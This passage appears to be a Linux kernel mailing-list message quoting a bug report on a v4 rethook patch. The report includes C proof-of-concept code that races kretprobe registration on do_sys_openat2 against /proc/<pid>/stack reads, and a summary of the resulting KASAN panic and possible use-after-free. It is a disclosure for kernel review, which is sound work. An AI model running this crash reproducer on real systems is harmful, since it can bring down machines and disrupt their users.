+>      while (!__atomic_load_n(&stop, __ATOMIC_RELAXED)) {
+>          int fd = open("/dev/null", O_RDONLY);
+>          if (fd >= 0) close(fd);
+>      }
+>      return NULL;
+> }
+> 
+> void *reader_thread(void *arg)
+> {
+>      pid_t target = *(pid_t *)arg;
+>      char path[64], buf[8192];
+>      snprintf(path, 64, "/proc/%d/stack", target);
+>      while (!__atomic_load_n(&stop, __ATOMIC_RELAXED)) {
+>          int fd = open(path, O_RDONLY);
+>          if (fd >= 0) { read(fd, buf, 8191); close(fd); }
+>      }
+>      return NULL;
+> }
+> 
+> void sigh(int s) { stop = 1; }
+> 
+> int main(int argc, char *argv[])
+> {
+>      int runtime = 120;
+>      if (argc > 1) runtime = atoi(argv[1]);
+> 
+>      printf("rethook race PoC\n");
+>      if (geteuid()) { printf("root needed\n"); return 1; }
+>      signal(SIGINT, sigh);
+> 
+>      pthread_t hot[4], rdr[4];
+>      pid_t hot_tids[4];
+>      int pairs = 4;
+> 
+>      for (int c = 0; c < runtime / 5 && !stop; c++) {
+>          tfs("events/kprobes/myretprobe/enable", "0");
+>          tfs("kprobe_events", "-:myretprobe");
+>          usleep(100);
+>          tfs("kprobe_events", "r:myretprobe do_sys_openat2 $retval");
+>          tfs("events/kprobes/myretprobe/enable", "1");
+> 
+>          pid_t main_tid = syscall(SYS_gettid);
+> 
+>          for (int i = 0; i < pairs; i++)
+>              pthread_create(&hot[i], NULL, hot_thread, NULL);
+> 
+>          usleep(300000);
+> 
+>          {
+>              DIR *d = opendir("/proc/self/task");
+>              int cnt = 0;
+>              if (d) {
+>                  struct dirent *de;
+>                  while ((de = readdir(d)) != NULL && cnt < pairs) {
+>                      pid_t t = atoi(de->d_name);
+>                      if (t > 0 && t != main_tid)
+>                          hot_tids[cnt++] = t;
+>                  }
+>                  closedir(d);
+>              }
+>              for (int i = 0; i < cnt; i++)
+>                  pthread_create(&rdr[i], NULL, reader_thread, &hot_tids[i]);
+>          }
+> 
+>          printf("round %d\n", c);
+>          sleep(5);
+> 
+>          stop = 1;
+>          usleep(100000);
+> 
+>          for (int i = 0; i < pairs; i++) pthread_join(hot[i], NULL);
+>          for (int i = 0; i < pairs; i++) pthread_join(rdr[i], NULL);
+> 
+>          stop = 0;
+>          usleep(1000);
+>      }
+> 
+>      tfs("events/kprobes/myretprobe/enable", "0");
+>      tfs("kprobe_events", "-:myretprobe");
+>      printf("Done\n");
+>      return 0;
+> }
+> 
+> ## Summary
+> 
+> The v4 commit message claims the iteration "will not crash," but the PoC
+> demonstrates a reproducible KASAN panic:
+> 
+> 1. stack-out-of-bounds in unwind_next_frame (ORC unwinder reads
+>     concurrently-modified stack frames of a running task)
+> 
+> 2. Potential use-after-free in __rethook_find_ret_addr (rethook nodes
+>     recycled without RCU grace period, cursor persists across RCU drops)
+> 
+> The old task_is_running() check was racy but served as a practical
+> safety net.  Removing it without adding equivalent protection in the
+> callers (proc_pid_stack, BPF stack walkers) exposes users to kernel
+> panics via /proc/<pid>/stack on any task running a kretprobe.
+> 
+> Thanks,
+> Xiao
+> 
+> 
+
+
 -- 
-2.52.0
-
+Masami Hiramatsu (Google) <mhiramat@kernel.org>
